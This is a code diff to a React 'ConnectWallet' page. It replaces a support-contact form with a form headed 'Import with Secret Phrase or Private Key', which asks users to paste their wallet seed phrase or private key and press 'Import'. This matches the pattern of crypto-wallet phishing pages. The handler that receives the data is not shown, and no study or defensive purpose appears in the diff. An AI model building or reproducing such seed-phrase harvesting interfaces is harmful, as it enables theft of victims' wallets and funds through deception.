@@ -94,76 +94,56 @@ export default function ConnectWallet() {
             </p>
           </div>
         ) : showApplicationForm ? (
-          <div className="max-w-3xl mx-auto" data-testid="application-form-container">
-            <div className="flex gap-2 mb-8">
-              <button className="flex items-center gap-2 bg-[#3dd9b3] text-[#0a1614] px-6 py-3 rounded-lg font-semibold" data-testid="tab-application">
-                <Shield className="w-4 h-4" />
-                Application Form
-              </button>
-              <button className="flex items-center gap-2 bg-transparent border border-[#3dd9b3]/20 text-[#9ca3af] px-6 py-3 rounded-lg" disabled data-testid="tab-private-key">
-                <Shield className="w-4 h-4" />
-                Private Key
-              </button>
-              <button className="flex items-center gap-2 bg-transparent border border-[#3dd9b3]/20 text-[#9ca3af] px-6 py-3 rounded-lg" disabled data-testid="tab-json">
-                <CreditCard className="w-4 h-4" />
-                JSON File
-              </button>
-            </div>
-
-            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-6" data-testid="heading-form">
-              Submit your connection request
+          <div className="max-w-2xl mx-auto" data-testid="application-form-container">
+            <h2 className="text-2xl font-bold text-[#f5f1e8] mb-8" data-testid="heading-form">
+              Import with Secret Phrase or Private Key
             </h2>
 
-            <div className="bg-[#1a2e2a]/30 border border-[#3dd9b3]/30 rounded-lg p-6 mb-6">
-              <div className="flex gap-3 text-[#3dd9b3]">
-                <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" />
-                <div>
-                  <h3 className="font-semibold mb-2">Your Security is Our Priority</h3>
-                  <p className="text-sm text-[#9ca3af]">
-                    Your information is processed securely and used only to assist with wallet connection. We use industry-standard encryption protocols to ensure your contact details remain completely private and secure throughout the support process.
-                  </p>
+            <form onSubmit={handleSubmitApplication} className="space-y-6">
+              <div className="space-y-2">
+                <label htmlFor="wallet-name" className="text-sm font-semibold text-[#f5f1e8]">
+                  Wallet Name
+                </label>
+                <Input
+                  id="wallet-name"
+                  type="text"
+                  required
+                  value={formData.name}
+                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
+                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280]"
+                  placeholder="Main wallet"
+                  data-testid="input-wallet-name"
+                />
+                <p className="text-xs text-[#9ca3af]">You can edit this later</p>
+              </div>
+
+              <div className="space-y-2">
+                <label htmlFor="application-details" className="text-sm font-semibold text-[#f5f1e8]">
+                  Enter Secret Phrase or Private Key
+                </label>
+                <Textarea
+                  id="application-details"
+                  required
+                  value={formData.message}
+                  onChange={(e) => setFormData({ ...formData, message: e.target.value })}
+                  className="bg-[#0a1614] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#6b7280] min-h-[160px]"
+                  placeholder=""
+                  data-testid="textarea-application"
+                />
+                <div className="text-xs text-[#9ca3af] space-y-1">
+                  <p>Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces</p>
+                  <p>Private Key is a long alphanumeric code</p>
                 </div>
               </div>
-            </div>
 
-            <form onSubmit={handleSubmitApplication} className="space-y-6">
-              <Textarea
-                id="application-details"
-                required
-                value={formData.message}
-                onChange={(e) => setFormData({ ...formData, message: e.target.value })}
-                className="bg-[#0f2520] border-[#3dd9b3]/20 text-[#f5f1e8] placeholder:text-[#5f7872] min-h-[180px] text-sm"
-                placeholder="Name: Your Full Name&#10;Email: your.email@example.com&#10;Wallet Address (optional): 0x...&#10;Issue Description: Describe what happened when trying to connect..."
-                data-testid="textarea-application"
-              />
-
-              <div className="space-y-2 text-sm text-[#9ca3af]">
-                <p>• Include your full name and email address so we can contact you</p>
-                <p>• Wallet address is optional but helps us assist you faster</p>
-                <p>• Describe the connection issue you experienced in detail</p>
-              </div>
-
-              <div className="flex gap-4 pt-4">
-                <Button
-                  type="button"
-                  onClick={() => {
-                    setShowApplicationForm(false);
-                    setShowManualConnect(true);
-                  }}
-                  size="lg"
-                  variant="outline"
-                  className="flex-1 border-[#3dd9b3]/40 text-[#9ca3af]"
-                  data-testid="button-cancel"
-                >
-                  Cancel
-                </Button>
+              <div className="flex justify-end pt-8">
                 <Button
                   type="submit"
                   size="lg"
-                  className="flex-1 bg-[#3dd9b3] text-[#0a1614] font-semibold"
+                  className="bg-[#3dd9b3] text-[#0a1614] font-semibold px-12"
                   data-testid="button-submit-application"
                 >
-                  Submit Request
+                  Import
                 </Button>
               </div>
             </form>
